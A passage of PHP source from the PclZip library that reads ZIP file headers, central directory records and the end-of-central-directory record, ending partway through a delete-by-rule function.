//      if ($p_entry['compressed_size'] == $p_entry['size'])
      if ($p_entry['compression'] == 0) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting an un-compressed file");
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Reading '".$p_entry['size']."' bytes");

        // ----- Reading the file
        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting a compressed file (compression method '".$p_entry['compression']."')");

        // ----- Reading the file
        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        // ----- Decompress the file
        if (($p_string = @gzinflate($v_data)) === FALSE) {
            // TBC
        }
      }

      // ----- Trace
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extraction done");
    }
    else {
        // TBC : error : can not extract a folder in a string
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privReadFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privReadFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privReadFileHeader", "");
    $v_result=1;

    // ----- Read the 4 bytes signature
    $v_binary_data = @fread($this->zip_fd, 4);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary data is : '".sprintf("%08x", $v_binary_data)."'");
    $v_data = unpack('Vid', $v_binary_data);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary signature is : '".sprintf("0x%08x", $v_data['id'])."'");

    // ----- Check signature
    if ($v_data['id'] != 0x04034b50)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Invalid File header");

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Read the first 42 bytes of the header
    $v_binary_data = fread($this->zip_fd, 26);

    // ----- Look for invalid block size
    if (strlen($v_binary_data) != 26)
    {
      $p_header['filename'] = "";
      $p_header['status'] = "invalid_header";
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Invalid block size : ".strlen($v_binary_data));

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Extract the values
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Header : '".$v_binary_data."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Header (Hex) : '".bin2hex($v_binary_data)."'");
    $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

    // ----- Get filename
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "File name length : ".$v_data['filename_len']);
    $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Filename : \''.$p_header['filename'].'\'');

    // ----- Get extra_fields
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extra field length : ".$v_data['extra_len']);
    if ($v_data['extra_len'] != 0) {
      $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
    }
    else {
      $p_header['extra'] = '';
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Extra field : \''.bin2hex($p_header['extra']).'\'');

    // ----- Extract properties
    $p_header['version_extracted'] = $v_data['version'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Version need to extract : ('.$p_header['version_extracted'].') \''.($p_header['version_extracted']/10).'.'.($p_header['version_extracted']%10).'\'');
    $p_header['compression'] = $v_data['compression'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Compression method : \''.$p_header['compression'].'\'');
    $p_header['size'] = $v_data['size'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Size : \''.$p_header['size'].'\'');
    $p_header['compressed_size'] = $v_data['compressed_size'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Compressed Size : \''.$p_header['compressed_size'].'\'');
    $p_header['crc'] = $v_data['crc'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'CRC : \''.sprintf("0x%X", $p_header['crc']).'\'');
    $p_header['flag'] = $v_data['flag'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Flag : \''.$p_header['flag'].'\'');
    $p_header['filename_len'] = $v_data['filename_len'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Filename_len : \''.$p_header['filename_len'].'\'');

    // ----- Recuperate date in UNIX format
    $p_header['mdate'] = $v_data['mdate'];
    $p_header['mtime'] = $v_data['mtime'];
    if ($p_header['mdate'] && $p_header['mtime'])
    {
      // ----- Extract time
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;

      // ----- Extract date
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
      $v_day = $p_header['mdate'] & 0x001F;

      // ----- Get UNIX date format
      $p_header['mtime'] = time();//mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }
    else
    {
      $p_header['mtime'] = time();
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date is actual : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }

    // TBC
    //for(reset($v_data); $key = key($v_data); next($v_data)) {
    //  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Attribut[$key] = ".$v_data[$key]);
    //}

    // ----- Set the stored filename
    $p_header['stored_filename'] = $p_header['filename'];

    // ----- Set the status field
    $p_header['status'] = "ok";

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privReadCentralFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privReadCentralFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privReadCentralFileHeader", "");
    $v_result=1;

    // ----- Read the 4 bytes signature
    $v_binary_data = @fread($this->zip_fd, 4);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary data is : '".sprintf("%08x", $v_binary_data)."'");
    $v_data = unpack('Vid', $v_binary_data);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary signature is : '".sprintf("0x%08x", $v_data['id'])."'");

    // ----- Check signature
    if ($v_data['id'] != 0x02014b50)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Invalid Central Dir File signature");

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Read the first 42 bytes of the header
    $v_binary_data = fread($this->zip_fd, 42);

    // ----- Look for invalid block size
    if (strlen($v_binary_data) != 42)
    {
      $p_header['filename'] = "";
      $p_header['status'] = "invalid_header";
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Invalid block size : ".strlen($v_binary_data));

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Extract the values
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Header : '".$v_binary_data."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Header (Hex) : '".bin2hex($v_binary_data)."'");
    $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

    // ----- Get filename
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "File name length : ".$p_header['filename_len']);
    if ($p_header['filename_len'] != 0)
      $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
    else
      $p_header['filename'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Filename : \''.$p_header['filename'].'\'');

    // ----- Get extra
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Extra length : ".$p_header['extra_len']);
    if ($p_header['extra_len'] != 0)
      $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
    else
      $p_header['extra'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Extra : \''.$p_header['extra'].'\'');

    // ----- Get comment
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Comment length : ".$p_header['comment_len']);
    if ($p_header['comment_len'] != 0)
      $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
    else
      $p_header['comment'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Comment : \''.$p_header['comment'].'\'');

    // ----- Extract properties
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Version : \''.($p_header['version']/10).'.'.($p_header['version']%10).'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Version need to extract : \''.($p_header['version_extracted']/10).'.'.($p_header['version_extracted']%10).'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Size : \''.$p_header['size'].'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Compressed Size : \''.$p_header['compressed_size'].'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'CRC : \''.sprintf("0x%X", $p_header['crc']).'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Flag : \''.$p_header['flag'].'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Offset : \''.$p_header['offset'].'\'');

    // ----- Recuperate date in UNIX format
    //if ($p_header['mdate'] && $p_header['mtime'])
    // TBC : bug : this was ignoring time with 0/0/0
    if (1)
    {
      // ----- Extract time
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;

      // ----- Extract date
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
      $v_day = $p_header['mdate'] & 0x001F;

      // ----- Get UNIX date format
      $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }
    else
    {
      $p_header['mtime'] = time();
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Date is actual : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }

    // ----- Set the stored filename
    $p_header['stored_filename'] = $p_header['filename'];

    // ----- Set default status to ok
    $p_header['status'] = 'ok';

    // ----- Look if it is a directory
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Internal (Hex) : '".sprintf("Ox%04X", $p_header['internal'])."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "External (Hex) : '".sprintf("Ox%04X", $p_header['external'])."' (".(($p_header['external']&0x00000010)==0x00000010?'is a folder':'is a file').')');
    if (substr($p_header['filename'], -1) == '/') {
      //$p_header['external'] = 0x41FF0010;
      $p_header['external'] = 0x00000010;
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Force folder external : \''.sprintf("Ox%04X", $p_header['external']).'\'');
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Header of filename : \''.$p_header['filename'].'\'');

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCheckFileHeaders()
  // Description :
  // Parameters :
  // Return Values :
  //   1 on success,
  //   0 on error;
  // --------------------------------------------------------------------------------
  function privCheckFileHeaders(&$p_local_header, &$p_central_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCheckFileHeaders", "");
    $v_result=1;

        // ----- Check the static values
        // TBC
        if ($p_local_header['filename'] != $p_central_header['filename']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "filename" : TBC To Be Completed');
        }
        if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "version_extracted" : TBC To Be Completed');
        }
        if ($p_local_header['flag'] != $p_central_header['flag']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "flag" : TBC To Be Completed');
        }
        if ($p_local_header['compression'] != $p_central_header['compression']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "compression" : TBC To Be Completed');
        }
        if ($p_local_header['mtime'] != $p_central_header['mtime']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "mtime" : TBC To Be Completed');
        }
        if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "filename_len" : TBC To Be Completed');
        }

        // ----- Look for flag bit 3
        if (($p_local_header['flag'] & 8) == 8) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Purpose bit flag bit 3 set !');
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'File size, compression size and crc found in central header');
        $p_local_header['size'] = $p_central_header['size'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Size : \''.$p_local_header['size'].'\'');
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Compressed Size : \''.$p_local_header['compressed_size'].'\'');
        $p_local_header['crc'] = $p_central_header['crc'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'CRC : \''.sprintf("0x%X", $p_local_header['crc']).'\'');
        }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privReadEndCentralDir()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privReadEndCentralDir(&$p_central_dir)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privReadEndCentralDir", "");
    $v_result=1;

    // ----- Go to the end of the zip file
    $v_size = filesize($this->zipname);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Size of the file :$v_size");
    @fseek($this->zip_fd, $v_size);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Position at end of zip file : \''.ftell($this->zip_fd).'\'');
    if (@ftell($this->zip_fd) != $v_size)
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- First try : look if this is an archive with no commentaries (most of the time)
    // in this case the end of central dir is at 22 bytes of the file end
    $v_found = 0;
    if ($v_size > 26) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Look for central dir with no comment');
      @fseek($this->zip_fd, $v_size-22);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Position after min central position : \''.ftell($this->zip_fd).'\'');
      if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
      {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Read for bytes
      $v_binary_data = @fread($this->zip_fd, 4);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Binary data is : '".sprintf("%08x", $v_binary_data)."'");
      $v_data = @unpack('Vid', $v_binary_data);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary signature is : '".sprintf("0x%08x", $v_data['id'])."'");

      // ----- Check signature
      if ($v_data['id'] == 0x06054b50) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found central dir at the default position.");
        $v_found = 1;
      }

      $v_pos = ftell($this->zip_fd);
    }

    // ----- Go back to the maximum possible size of the Central Dir End Record
    if (!$v_found) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Start extended search of end central dir');
      $v_maximum_size = 65557; // 0xFFFF + 22;
      if ($v_maximum_size > $v_size)
        $v_maximum_size = $v_size;
      @fseek($this->zip_fd, $v_size-$v_maximum_size);
      if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
      {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Position after max central position : \''.ftell($this->zip_fd).'\'');

      // ----- Read byte per byte in order to find the signature
      $v_pos = ftell($this->zip_fd);
      $v_bytes = 0x00000000;
      while ($v_pos < $v_size)
      {
        // ----- Read a byte
        $v_byte = @fread($this->zip_fd, 1);

        // -----  Add the byte
        $v_bytes = ($v_bytes << 8) | Ord($v_byte);

        // ----- Compare the bytes
        if ($v_bytes == 0x504b0506)
        {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Found End Central Dir signature at position : \''.ftell($this->zip_fd).'\'');
          $v_pos++;
          break;
        }

        $v_pos++;
      }

      // ----- Look if not found end of central dir
      if ($v_pos == $v_size)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to find End of Central Dir Record signature");

        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
    }

    // ----- Read the first 18 bytes of the header
    $v_binary_data = fread($this->zip_fd, 18);

    // ----- Look for invalid block size
    if (strlen($v_binary_data) != 18)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Extract the values
    ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Central Dir Record : '".$v_binary_data."'");
    ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Central Dir Record (Hex) : '".bin2hex($v_binary_data)."'");
    $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

    // ----- Check the global size
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Comment length : ".$v_data['comment_size']);
    if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The central dir is not at the end of the archive. Some trailing bytes exists after the archive.");

          // ----- Removed in release 2.2 see readme file
          // The check of the file size is a little too strict.
          // Some bugs where found when a zip is encrypted/decrypted with 'crypt'.
          // While decrypted, zip has training 0 bytes
          if (0) {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                               'The central dir is not at the end of the archive.'
                                                   .' Some trailing bytes exists after the archive.');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
          }
    }

    // ----- Get comment
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Comment size : \''.$v_data['comment_size'].'\'');
    if ($v_data['comment_size'] != 0) {
      $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
    }
    else
      $p_central_dir['comment'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Comment : \''.$p_central_dir['comment'].'\'');

    $p_central_dir['entries'] = $v_data['entries'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Nb of entries : \''.$p_central_dir['entries'].'\'');
    $p_central_dir['disk_entries'] = $v_data['disk_entries'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Nb of entries for this disk : \''.$p_central_dir['disk_entries'].'\'');
    $p_central_dir['offset'] = $v_data['offset'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Offset of Central Dir : \''.$p_central_dir['offset'].'\'');
    $p_central_dir['size'] = $v_data['size'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Size of Central Dir : \''.$p_central_dir['size'].'\'');
    $p_central_dir['disk'] = $v_data['disk'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Disk number : \''.$p_central_dir['disk'].'\'');
    $p_central_dir['disk_start'] = $v_data['disk_start'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Start disk number : \''.$p_central_dir['disk_start'].'\'');

    // TBC
    //for(reset($p_central_dir); $key = key($p_central_dir); next($p_central_dir)) {
    //  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "central_dir[$key] = ".$p_central_dir[$key]);
    //}

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDeleteByRule()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDeleteByRule(&$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privDeleteByRule", "");
    $v_result=1;
    $v_list_detail = array();

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('rb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privCloseFd();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");

    // ----- Scan all the files
    // ----- Start at beginning of Central Dir
    $v_pos_entry = $v_central_dir['offset'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position before rewind : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after rewind : ".ftell($this->zip_fd)."'");
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      // ----- Close the zip file
      $this->privCloseFd();

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after fseek : ".ftell($this->zip_fd)."'");

    // ----- Read each entry
    $v_header_list = array();
    $j_start = 0;
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Read next file header entry (index '$i')");

      // ----- Read the file header
      $v_header_list[$v_nb_extracted] = array();
      if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
      {
        // ----- Close the zip file
        $this->privCloseFd();

        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }

      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename (index '$i') : '".$v_header_list[$v_nb_extracted]['stored_filename']."'");

      // ----- Store the index
      $v_header_list[$v_nb_extracted]['index'] = $i;

      // ----- Look for the specific extract rules
      $v_found = false;

      // ----- Look for extract by name rule
      if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
          && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByName'");

          // ----- Look if the filename is in the list
          for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Compare with file '".$p_options[PCLZIP_OPT_BY_NAME][$j]."'");

              // ----- Look for a directory
              if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The searched item is a directory");

                  // ----- Look if the directory is in the filename path
                  if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                      && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The directory is in the file path");
                      $v_found = true;
                  }
